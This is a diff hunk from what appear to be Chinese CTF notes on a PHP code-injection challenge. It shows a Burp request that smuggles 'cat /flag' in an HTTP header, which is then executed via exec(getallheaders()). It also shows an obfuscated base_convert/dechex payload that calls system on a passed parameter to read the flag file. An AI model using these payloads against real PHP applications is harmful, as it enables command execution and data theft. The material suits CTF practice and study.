@@ -54,7 +54,7 @@ burp抓包在Content-Length下一行，不加空行, 将1:cat /flag作为header�
 Content-Length: 11
 1: cat /flag
 
-exec(getallheaders(){1}) //操作xx和yy，中间用逗号隔开，echo都能输出 echo xx,yy
+exec(getallheaders(){1}) //操作xx和yy 对应cat /flag，中间用逗号隔开，echo都能输出 echo xx,yy
 
 方法3: 强制传参
 exp=cat /flag&abs=system&c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){abs}($$pi{exp})
